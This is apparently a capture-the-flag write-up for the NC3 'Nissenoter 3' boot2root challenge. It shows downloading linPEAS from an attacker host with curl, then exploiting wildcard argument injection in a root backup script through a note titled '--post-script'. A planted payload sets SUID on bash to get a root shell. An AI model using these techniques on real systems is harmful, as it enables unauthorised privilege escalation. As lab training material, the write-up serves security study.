+++
title = 'Nissenoter 3'
categories = ['Boot2Root']
date = 2023-12-15T15:33:38+01:00
+++

## Challenge Name:

Nissenoter 3

## Category:

Boot2Root

## Challenge Description:

Vi er sikre på, nisserne deler statshemmeligheder, hvorfor skulle netværket ellers være lukket og være beskyttet af teknologi i verdensklasse? - Vores praktikant siger i hvert fald, at det er verdensklasse.

_Opgaven er tilgængelig via Haaukins:_

https://ncctf.haaukins.dk/

## Approach

### The final enumeration

Continuing from [Nissenoter 2](/nc3/boot2root/nissenoter-2) we now have foothold on the server as a user!

Let's immediately execute some initial enumeration and see what we can find

```bash
rrensdyr@edc9b2907c7e:~$ whoami && uname -a && sudo -l
rrensdyr
Linux edc9b2907c7e 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 GNU/Linux
-bash: sudo: command not found
```

We are connected as the rrendsyr user on a Linux system, but cannot execute anything as super user. We already know from the previous challenge, that the only file in our home directly is the flag.

```bash
rrensdyr@edc9b2907c7e:~$ find / -type f -perm -04000 -ls 2>/dev/null
  5943279     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount
  5943371     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
  5943284     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
  5943295     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
  5943160     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
  5943347     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
  5943154     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
  5943221     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
  6704110    640 -rwsr-xr-x   1 root     root       653888 Sep 23 22:11 /usr/lib/openssh/ssh-keysign
  6704087     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16 10:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  rrensdyr@edc9b2907c7e:~$
```

The intention of this command is to look for [SUID bits](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit), which can be used in certain situations to escalate privileges (PrivEsc). One great site for finding such tricks is [GTFOBINS](https://gtfobins.github.io/).
Unfortunately this is also not a possible path forward, seeing as only the root user has these bits set.

We therefore upload an enumeration script from our attacking machine to the victim by opening a webserver from our Kali machine

```bash
┌──(haaukins㉿kali)-[~]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

and on the victim we make a wget request to download linPeas

```bash
rrensdyr@edc9b2907c7e:~$ curl -O http://77.229.233.4:1337/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  815k  100  815k    0     0  51.5M      0 --:--:-- --:--:-- --:--:-- 53.1M
rrensdyr@edc9b2907c7e:~$ ls
flag.txt  linpeas.sh
rrensdyr@edc9b2907c7e:~$ chmod +x linpeas.sh
```

After downloading the [enumeration script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and making it executable, we run it and read through the report, in which we see that there is an interesting "/var/backups/backup.sh" script owned by root

```bash
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 632 Dec  8 08:27 /var/backups/backup.sh
```

Let's take a look at this script

```bash
#!/bin/bash

user_notes="/var/www/html/user_notes/"
backup_dir="/var/backups/user_notes/"
backup_file="$backup_dir$(date +%Y%m%d-%H%M%S).tar.gz"

function backup {
  pushd "$user_notes" > /dev/null || exit
  tmp_dir=$(mktemp -d)
  /usr/local/bin/backup -o "$tmp_dir" *
  pushd "$tmp_dir" > /dev/null || exit
  tar -czf "$backup_file" .
  popd > /dev/null || exit
  rm -rf "$tmp_dir"
}

function remove_old_backups {
  dir_files=$(find $backup_dir -type f -name "*.tar.gz" | wc -l)

  if [[ "$dir_files" -gt 7 ]]; then
    find $backup_dir -type f -name "*.tar.gz" | sort | head -n -7 | xargs rm -f
  fi
}

backup
remove_old_backups
```

Upon examining the backup.sh script, we confirm that it indeed takes backups. Two functions are defined: backup and remove_old_backups. Starting with remove_old_backups, we see that it checks if there are more than 7 files ending with .tar.gz in the "/var/backups/user_notes/" directory and deletes the oldest files to leave only 7 remaining.

The backup function changes the current directory to "/var/www/html/user_notes/", then creates a temporary folder. Once this is done, a binary file, "/usr/local/bin/backup", is called with some parameters. After the binary is called, the script moves the folder to temp_dir, where it packs all the files in the folder into a .tar.gz file and saves this file in "/var/backups/user_notes/".

It's time to take a closer look at "/usr/local/bin/backup". Firstly, to find out what -o does, even though we can guess based on the script, but also to see if there are other parameters that can be set. The reason this is interesting is the way the file is called. Namely, with _, which is a Bash Wildcard, as the last parameter. In bash, _ expands to all files in the current directory, so in principle, backup is called as follows.

```bash
/usr/local/bin/backup -o "/tmp/tmp.3yNOBzjK59" file1 file2 file3 etc
```

This means that if there are any interesting parameters that can be set in connection with backup, we have the opportunity to set them if we can control the filenames that appear in "/var/www/html/user_notes/". Therefore, let's immediately check what backup can do.

```bash
rrensdyr@bdf69f47608c:~$ /usr/local/bin/backup
Missing output folder
Allowed options:
--help produce help message
-i [ --input-files ] arg Files to backup
-o [ --output-folder ] arg Folder to backup to
--pre-script arg Script to run before starting the backup
--post-script arg Script to run after finishing the backup
```

Okay, it looks like it can run scripts both before and after a backup has been made, via --pre-script and --post-script, respectively. From here, one can either take an educated guess, guessing that, for example, .sh files are meant, or download and reverse engineer the backup binary.

We take an educated guess. So let's write two files to "/var/www/html/user_notes/", one named "--post-script", and one named "Adamino", containing our exploit. Unfortunately, rrensdyr cannot write to the folder, so we need to do it through the web interface.

First, we create a note with the title Adamino and the following content:

```bash
#!/usr/bin/bash
chmod +s /usr/bin/bash
```

"chmod +s" is used for setuid and ensures that a binary will run with the privileges of the file owner. In this case, the owner is root, which happens to be the user we want to access.

Then, a note is created with the title "--post-script" and arbitrary content. Once that file is created, our exploit code will be executed.

```bash
rrensdyr@bdf69f47608c:~$ ls -l /usr/bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23 2023 /usr/bin/bash
```

As we can see in the snippet above, setuid (SUID) and setguid (SGID) have been set on /usr/bin/bash, which is perfect. If we now call bash with the -p flag, for privileged mode, we get a root shell.

```bash
rrensdyr@bdf69f47608c:~$ bash -p
bash-5.2# whoami
root
```

As shown in the snippet above, we have now succeeded, and the final flag can be retrieved!

```bash
bash-5.2# cat /root/flag.txt
NC3{1. Always backup; 2. Forget --; 3. ???? 4. Profit!}
```

## Flag

```text
NC3{1. Always backup; 2. Forget --; 3. ???? 4. Profit!}
```

## Reflections and Learnings

### Initial Enumeration and Strategy:

Employing tools like linpeas.sh was a critical step. It allowed us to discover the /var/backups/backup.sh script, which became the focal point for further investigation. This reinforces the importance of using the right tools for efficient system analysis.

### Analyzing the Backup Script:

The deep dive into the backup.sh script was a reminder that sometimes, the path to escalation lies not in exploiting a weakness but in leveraging the intended functionality of system scripts.

### Exploiting the Backup Binary:

The discovery of the --pre-script and --post-script options in /usr/local/bin/backup was pivotal. It’s a lesson in thorough examination and thinking creatively about how to use the system's features to our advantage.

### The journey at an end

All in all Nissenoter was great fun and a wonderful learning path for Web exploitation! In its essence it was a tremendous showcase of a "typical HackTheBox" challenge, in which we through careful enumeration can identify exploits to execute in order to gain foothold and in the end escalate our privileges to become system administrator and retrieve the final flag!
